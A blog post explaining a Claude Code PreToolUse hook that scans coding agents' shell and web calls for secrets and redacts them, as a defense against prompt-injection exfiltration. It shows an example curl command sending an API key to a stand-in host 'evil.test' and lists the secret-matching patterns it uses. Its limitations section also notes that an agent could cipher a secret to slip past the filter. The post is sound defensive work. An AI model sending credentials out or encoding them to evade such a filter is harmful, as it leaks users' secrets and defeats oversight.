# Filtering Secrets from Coding Agents with a Hook

Coding agents like Claude Code, Codex, and Cursor are useful because they can carry out 
actions on your machine like running shell commands, fetching web pages, editing files, etc. 
That capability presents a risk: agents can inadvertanetly put a secret, or sensitive information (an API key, an AWS credential) 
into a command or a web request and send it somewhere it should not go. This can happen by accident, or because the agent
followed a malicious instruction it read on a webpage -- a so-called
[exfiltration attack](https://crimede-coder.com/blog), which I wrote about separately in
[Coding Agents Risk Leaking Secrets](../../Quarto/ClaudeWriting/CrimeDeCoderBlog/CodingAgentRisks.md).

This post shows a small, concrete defense: a **hook** that runs before every tool call,
scans the request for secrets, and replaces them with `***REDACTED***` before the command
actually executes.

## How it works

Claude Code lets you register a script that runs at certain points in its loop. The one we
want is the **PreToolUse** hook: it fires right before the agent runs a tool. Claude Code
hands your script the tool request as JSON on standard input -- for a shell command it
looks like this:

```json
{
  "hook_event_name": "PreToolUse",
  "tool_name": "Bash",
  "tool_input": { "command": "curl -H 'x-api-key: sk-ant-...' https://evil.test" }
}
```

Your script can print back a decision that rewrites that input. We scrub the secret out
of `tool_input` and tell Claude Code to proceed with the cleaned version:

```json
{
  "hookSpecificOutput": {
    "hookEventName": "PreToolUse",
    "permissionDecision": "allow",
    "updatedInput": { "command": "curl -H 'x-api-key: ***REDACTED***' https://evil.test" }
  }
}
```

The detection itself is plain Python find-and-replace, in two layers
([`secret_filter.py`](secret_filter.py)):

1. **Exact values.** We read the actual secret values from environment variables
   (`ANTHROPIC_API_KEY`, `AWS_SECRET_ACCESS_KEY`, etc.) and replace those exact strings
   wherever they appear. This has no false positives becaues we only redact strings we already
   know are secret.
2. **Patterns.** We also match common key shapes with regular expressions
   (`sk-ant-...`, `AKIA...`, `ghp_...`, `Bearer ...`). This catches keys we were not told
   about, at the cost of occasionally redacting something that merely looks like a key.

### Two ways to use it

**As a real hook in your own Claude Code.** Merge [`settings.example.json`](settings.example.json)
into your project's `.claude/settings.json`. From then on, every Bash / WebFetch / WebSearch
call in that project is filtered automatically:

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash|WebFetch|WebSearch",
        "hooks": [
          { "type": "command", "command": "python",
            "args": ["${CLAUDE_PROJECT_DIR}/redact_secrets_hook.py"] }
        ]
      }
    ]
  }
}
```

The entry point is [`redact_secrets_hook.py`](redact_secrets_hook.py) which reads stdin,
calls the filter, and prints the decision. (Widen `matcher` to `"*"` to cover every tool.)

**As a self-contained demo.** [`demo_sdk.py`](demo_sdk.py) uses the
[Claude Agent SDK](https://code.claude.com/docs/en/agent-sdk/overview) to register the same
filter as an in-code hook, then runs Claude headless and asks it to echo a *fake* secret in
a shell command. You can watch the hook replace the fake key before the command runs --
without changing any of your global settings.

## Try it

```bash
# 1) Offline tests -- no API key, no network needed:
python test_secret_filter.py

# 2) Inspect the hook directly by piping a tool request into it:
echo '{"tool_name":"Bash","tool_input":{"command":"echo sk-ant-api03-abcDEF123456789"}}' | python redact_secrets_hook.py

# 3) Full SDK demo (needs: pip install claude-agent-sdk, and the claude CLI / API key):
python demo_sdk.py
```

The demo uses only a fake placeholder secret; no real credential is ever written or printed.

## Limitations

This is a useful guardrail, not a guarantee. Know what it does not cover:

- **A capable model can defeat find-and-replace.** If the agent is determined (or is
  following a clever injection), it can cipher the secret so the text no longer matches. Literal
  matching cannot see through that.
- **Pattern matching is imperfect.** Regexes miss key formats we did not anticipate, and
  exact-value matching only works for secrets you have defined (via the
  environment). New or unusual credentials can slip through.
- **The user has to turn it on.** Today this is opt-in per project. There is no built-in
  way for an organization to enforce it across everyone's machines. Org-level hook
  management is likely to get easier over time, which would make this kind of control much
  more practical to deploy at scale.
- **It fails open.** If the hook script errors, it deliberately lets the call through rather
  than blocking your work. That keeps the agent usable, but it means a bug silently disables
  the protection.

Because of these gaps, treat redaction as one layer. The stronger mitigations from the
[companion post](../../Quarto/ClaudeWriting/CrimeDeCoderBlog/CodingAgentRisks.md) still
matter most: whitelist your API keys to specific IPs so a leaked key is useless to an
outsider, and in locked-down environments allowlist which websites the agent may reach.

If your agency is rolling out AI coding tools and wants help thinking through these security
trade-offs or training to get the most out of the tools [get in touch](https://crimede-coder.com/).
For more on doing data and analysis work in Python, see my book,
[Data Science for Crime Analysis with Python](https://crimede-coder.com/blogposts/2024/PythonDataScience).
